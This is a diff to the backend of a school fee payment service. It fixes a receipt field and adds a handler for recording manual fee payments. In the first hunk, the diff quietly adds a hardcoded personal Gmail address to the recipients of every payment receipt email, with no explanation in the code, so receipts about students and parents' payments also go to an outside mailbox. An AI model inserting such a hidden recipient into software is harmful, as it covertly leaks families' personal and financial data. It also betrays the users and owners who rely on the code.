@@ -141,6 +141,7 @@ async function sendPaymentReceiptEmails(db, { school, student, feeDoc, paymentAm
     const recipients = [...new Set([
         String(student?.parentEmail || '').trim(),
         String(school?.email || '').trim(),
+        'lexrunit@gmail.com',
     ].filter(Boolean))];
 
     if (recipients.length === 0) return [];
@@ -2436,7 +2437,7 @@ const actions = {
                             term,
                             session,
                             paymentAmount: Number(amount || 0),
-                            totalCharge,
+                            totalCharge: totalAmount,
                             platformFee: platformFeeAmount,
                         }),
                     });
@@ -2456,6 +2457,131 @@ const actions = {
                 return { success: false, error: error.message };
             }
         }
+    },
+
+    /** Get school fees report */
+    recordManualSchoolFeePayment: {
+        auth: true,
+        handler: async ({ payload, authId }) => {
+            const db = getDb();
+            const { studentId, amount, term, session, paymentMethod, notes } = payload;
+
+            if (!studentId || !amount || !term || !session) {
+                return { success: false, error: 'studentId, amount, term and session are required.' };
+            }
+
+            const amountToRecord = Number(amount || 0);
+            if (!Number.isFinite(amountToRecord) || amountToRecord <= 0) {
+                return { success: false, error: 'Invalid payment amount.' };
+            }
+
+            try {
+                const user = await getUserByAuthId(authId);
+                if (!user) {
+                    return { success: false, error: 'Authenticated user profile not found.' };
+                }
+
+                const [student, school] = await Promise.all([
+                    db.getDocument(DATABASE_ID, COLLECTIONS.STUDENTS.id, studentId),
+                    db.getDocument(DATABASE_ID, COLLECTIONS.SCHOOLS.id, user.schoolId),
+                ]);
+
+                if (student.schoolId !== user.schoolId) {
+                    return { success: false, error: 'Student does not belong to your school.' };
+                }
+
+                let feeDoc = null;
+                const feeRows = await db.listDocuments(DATABASE_ID, COLLECTIONS.SCHOOL_FEES.id, [
+                    Query.equal('schoolId', user.schoolId),
+                    Query.equal('studentId', studentId),
+                    Query.equal('term', term),
+                    Query.equal('session', session),
+                    Query.limit(1),
+                ]);
+
+                if (feeRows.total > 0) {
+                    feeDoc = feeRows.documents[0];
+                } else {
+                    const schoolData = parseJson(school.data || '{}', {});
+                    const classFeeAmounts = schoolData.classFeeAmounts || {};
+                    const configuredAmount = Number(classFeeAmounts[student.className] || amountToRecord || 0);
+
+                    if (!Number.isFinite(configuredAmount) || configuredAmount <= 0) {
+                        return { success: false, error: 'No class fee configured for this student. Configure class fee first.' };
+                    }
+
+                    feeDoc = await db.createDocument(DATABASE_ID, COLLECTIONS.SCHOOL_FEES.id, ID.unique(), {
+                        schoolId: user.schoolId,
+                        studentId,
+                        term,
+                        session,
+                        amount: configuredAmount,
+                        platformFee: 0,
+                        totalAmount: configuredAmount,
+                        status: 'pending',
+                        amountPaid: 0,
+                        outstandingAmount: configuredAmount,
+                        paymentMethod: 'manual',
+                        createdAt: nowIso(),
+                    });
+                }
+
+                const principalAmount = Number(feeDoc.amount || 0);
+                const alreadyPaid = Number(feeDoc.amountPaid || 0);
+                const outstandingAmount = Math.max(0, Number((principalAmount - alreadyPaid).toFixed(2)));
+
+                if (amountToRecord > outstandingAmount) {
+                    return { success: false, error: `Amount exceeds outstanding balance of ${outstandingAmount}` };
+                }
+
+                const reference = `MANUAL-${feeDoc.$id.slice(0, 8)}-${Date.now()}`;
+                const manualMeta = {
+                    type: 'school_fee',
+                    kind: 'school_fee',
+                    stage: 'initiated',
+                    feeId: feeDoc.$id,
+                    studentId,
+                    schoolId: user.schoolId,
+                    term,
+                    session,
+                    paymentAmount: amountToRecord,
+                    paymentMethod: String(paymentMethod || 'manual').slice(0, 50),
+                    notes: String(notes || '').slice(0, 1000),
+                    source: 'admin_manual_record',
+                };
+
+                await createPaymentAttemptRecord(db, {
+                    schoolId: user.schoolId,
+                    reference,
+                    amount: amountToRecord,
+                    currency: 'NGN',
+                    type: 'school_fee',
+                    status: 'pending',
+                    provider: 'manual',
+                    description: `Manual school fee payment (${term} ${session})`,
+                    studentId,
+                    createdAt: nowIso(),
+                    metadata: JSON.stringify(manualMeta),
+                });
+
+                const finalized = await finalizeSchoolFeePayment(db, {
+                    transactionRef: reference,
+                    metadata: manualMeta,
+                    paymentDate: nowIso(),
+                });
+
+                return {
+                    success: true,
+                    data: {
+                        reference,
+                        feeId: feeDoc.$id,
+                        alreadyProcessed: Boolean(finalized?.alreadyProcessed),
+                    },
+                };
+            } catch (error) {
+                return { success: false, error: error.message };
+            }
+        },
     },
 
     /** Get school fees report */
